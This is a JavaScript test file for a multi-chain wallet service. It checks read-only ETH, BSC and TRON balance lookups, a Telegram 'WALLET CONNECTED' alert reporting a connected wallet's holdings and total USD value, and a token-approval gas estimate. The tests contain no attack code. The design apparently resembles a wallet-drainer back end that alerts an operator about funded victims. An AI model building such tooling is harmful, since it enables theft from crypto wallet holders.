const { test, beforeEach } = require("node:test");
const assert = require("node:assert/strict");
const env = require("../config/env");
const {
    fetchAccountBalance,
    refreshBalances,
    resetBalanceCache,
    encodeBalanceOf
} = require("../services/balances");
const { estimateApprovalGas } = require("../services/gasEstimate");
const { resetPriceCache } = require("../services/prices");
const { buildWalletConnectedMessage } = require("../services/telegramNotifications");
const sessionStore = require("../storage/sessions");

const ETH_ADDR = "0xcccccccccccccccccccccccccccccccccccccccc";
const TOKEN = "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

beforeEach(() => {
    resetBalanceCache();
    resetPriceCache();
    env.ETH_USDT_CONTRACT = TOKEN;
    env.BSC_USDT_CONTRACT = TOKEN;
    env.TRON_USDT_CONTRACT = "TRONUSDTCONTRACTTEST111111111111111";
    env.ETH_CARD_CONTRACT = "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    env.BSC_CARD_CONTRACT = "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    env.TRON_CARD_CONTRACT = "TRONCARDCONTRACTTEST1111111111111111";
});

function hexQty(value) {
    return `0x${BigInt(value).toString(16)}`;
}

function evmMock({ native = 0n, usdt = 0n, failNative = false, failUsdt = false, methods = [] }) {
    return async (_url, options) => {
        const body = JSON.parse(options.body);
        methods.push(body.method);

        if (body.method === "eth_getBalance") {
            if (failNative) {
                throw new Error("native rpc down");
            }

            return { json: async () => ({ result: hexQty(native) }) };
        }

        if (body.method === "eth_call") {
            if (failUsdt) {
                throw new Error("token rpc down");
            }

            assert.match(body.params[0].data, /^0x70a08231/);
            return { json: async () => ({ result: hexQty(usdt) }) };
        }

        throw new Error(`unexpected method ${body.method}`);
    };
}

test("1. Ethereum native balance", async () => {
    const methods = [];
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { ETH: 2000, USDT: 1 },
        fetchImpl: evmMock({ native: 10n ** 15n, usdt: 0n, methods })
    });

    assert.equal(snapshot.native.symbol, "ETH");
    assert.equal(snapshot.native.balance, "0.001");
    assert.equal(methods.includes("eth_getBalance"), true);
    assert.equal(methods.some((item) => item.includes("send")), false);
});

test("2. Ethereum USDT balance", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { ETH: null, USDT: 1 },
        fetchImpl: evmMock({ native: 0n, usdt: 12500000n })
    });

    assert.equal(snapshot.usdt.symbol, "USDT");
    assert.equal(snapshot.usdt.decimals, 6);
    assert.equal(snapshot.usdt.balance, "12.5");
    assert.equal(snapshot.usdt.usdValue, "12.50");
});

test("3. BSC native balance", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:56",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { BNB: 600, USDT: 1 },
        fetchImpl: evmMock({ native: 2n * 10n ** 18n, usdt: 0n })
    });

    assert.equal(snapshot.native.symbol, "BNB");
    assert.equal(snapshot.native.balance, "2");
    assert.equal(snapshot.network, "bsc");
});

test("4. BSC USDT balance", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:56",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { BNB: null, USDT: 1 },
        fetchImpl: evmMock({ native: 0n, usdt: 10n ** 18n })
    });

    assert.equal(snapshot.usdt.decimals, 18);
    assert.equal(snapshot.usdt.balance, "1");
});

test("5. TRON native balance", async () => {
    const snapshot = await fetchAccountBalance({
        address: "TXYZaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        chainId: "tron:0x2b6653dc",
        namespace: "tron"
    }, {
        skipCache: true,
        prices: { TRX: 0.1, USDT: 1 },
        fetchImpl: async (url) => {
            assert.equal(String(url).includes("/v1/accounts/"), true);
            assert.equal(String(url).includes("triggerSmartContract"), false);
            return {
                ok: true,
                json: async () => ({
                    data: [{
                        balance: 95019,
                        trc20: []
                    }]
                })
            };
        }
    });

    assert.equal(snapshot.native.symbol, "TRX");
    assert.equal(snapshot.native.balance, "0.095019");
});

test("6. TRON USDT balance", async () => {
    const snapshot = await fetchAccountBalance({
        address: "TXYZaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        chainId: "tron:0x2b6653dc",
        namespace: "tron"
    }, {
        skipCache: true,
        prices: { TRX: null, USDT: 1 },
        fetchImpl: async () => ({
            ok: true,
            json: async () => ({
                data: [{
                    balance: 0,
                    trc20: [{ [env.TRON_USDT_CONTRACT]: "12500000" }]
                }]
            })
        })
    });

    assert.equal(snapshot.usdt.balance, "12.5");
    assert.equal(snapshot.usdt.usdValue, "12.50");
});

test("7. Missing RPC", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        rpcUrl: "",
        prices: {}
    });

    assert.equal(snapshot.native.balance, null);
    assert.match(snapshot.native.error, /Missing RPC/);
});

test("8. RPC failure isolates native error", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { ETH: 1, USDT: 1 },
        fetchImpl: evmMock({ failNative: true, usdt: 1000000n })
    });

    assert.equal(snapshot.native.balance, null);
    assert.equal(snapshot.usdt.balance, "1");
});

test("9. Token read failure leaves native intact", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { ETH: 1, USDT: 1 },
        fetchImpl: evmMock({ native: 10n ** 18n, failUsdt: true })
    });

    assert.equal(snapshot.native.balance, "1");
    assert.equal(snapshot.usdt.balance, null);
    assert.equal(snapshot.usdt.usdValue, null);
});

test("10. Missing token configuration", async () => {
    env.ETH_USDT_CONTRACT = "";
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { ETH: 1, USDT: 1 },
        fetchImpl: evmMock({ native: 0n, usdt: 1n })
    });

    assert.match(snapshot.usdt.error, /ETH_USDT_CONTRACT/);
    assert.equal(snapshot.usdt.balance, null);
});

test("11. Missing wallet address", async () => {
    const snapshot = await fetchAccountBalance({
        chainId: "eip155:1",
        namespace: "eip155"
    }, { skipCache: true, prices: {} });

    assert.match(snapshot.error, /Missing wallet address/);
});

test("12. Multiple connected networks", async () => {
    const session = sessionStore.addSession({
        connectionId: `bal-${Date.now()}`,
        status: "settled",
        sessionTopic: "t",
        accounts: [
            { address: ETH_ADDR, chainId: "eip155:1", namespace: "eip155", account: `eip155:1:${ETH_ADDR}` },
            { address: ETH_ADDR, chainId: "eip155:56", namespace: "eip155", account: `eip155:56:${ETH_ADDR}` }
        ]
    });

    const stored = await refreshBalances(session.connectionId, {
        skipCache: true,
        prices: { ETH: 1, BNB: 1, USDT: 1 },
        fetchImpl: evmMock({ native: 10n ** 18n, usdt: 0n })
    });

    assert.equal(stored.balances.length, 2);
    assert.equal(stored.balances[0].network, "eth");
    assert.equal(stored.balances[1].network, "bsc");
});

test("13. USD price unavailable stays null not zero", async () => {
    const snapshot = await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: { ETH: null, USDT: null },
        fetchImpl: evmMock({ native: 10n ** 18n, usdt: 1000000n })
    });

    assert.equal(snapshot.native.balance, "1");
    assert.equal(snapshot.native.usdValue, null);
    assert.equal(snapshot.usdt.usdValue, null);
});

test("14. Telegram receives normalized balance data", () => {
    const message = buildWalletConnectedMessage({
        connectionId: "c1",
        walletName: "Trust Wallet",
        accounts: [{ address: ETH_ADDR, chainId: "eip155:1", namespace: "eip155" }],
        balances: [{
            network: "eth",
            chainId: "eip155:1",
            address: ETH_ADDR,
            native: { symbol: "ETH", balance: "0.12", usdValue: "240.00" },
            usdt: { symbol: "USDT", balance: "12.50", usdValue: "12.50" }
        }],
        totalUsd: "252.50"
    });

    assert.match(message, /1\/3 WALLET CONNECTED/);
    assert.match(message, /Ethereum \/ ERC-20/);
    assert.match(message, /ETH: 0\.12/);
    assert.match(message, /12\.50/);
});

test("15. No transaction methods are called during balance retrieval", async () => {
    const methods = [];
    await fetchAccountBalance({
        address: ETH_ADDR,
        chainId: "eip155:1",
        namespace: "eip155"
    }, {
        skipCache: true,
        prices: {},
        fetchImpl: evmMock({ native: 0n, usdt: 0n, methods })
    });

    assert.deepEqual([...new Set(methods)].sort(), ["eth_call", "eth_getBalance"]);
    assert.equal(encodeBalanceOf(ETH_ADDR).startsWith("0x70a08231"), true);
});

test("estimateApprovalGas is read-only", async () => {
    const methods = [];
    const result = await estimateApprovalGas({
        network: "eth",
        from: ETH_ADDR,
        nativeBalanceRaw: hexQty(10n ** 18n)
    }, {
        fetchImpl: async (_url, options) => {
            const body = JSON.parse(options.body);
            methods.push(body.method);
            return { json: async () => ({ result: "0x5208" }) };
        }
    });

    assert.equal(result.sufficient, true);
    assert.equal(methods.includes("eth_sendTransaction"), false);
    assert.equal(methods.includes("eth_estimateGas"), true);
});
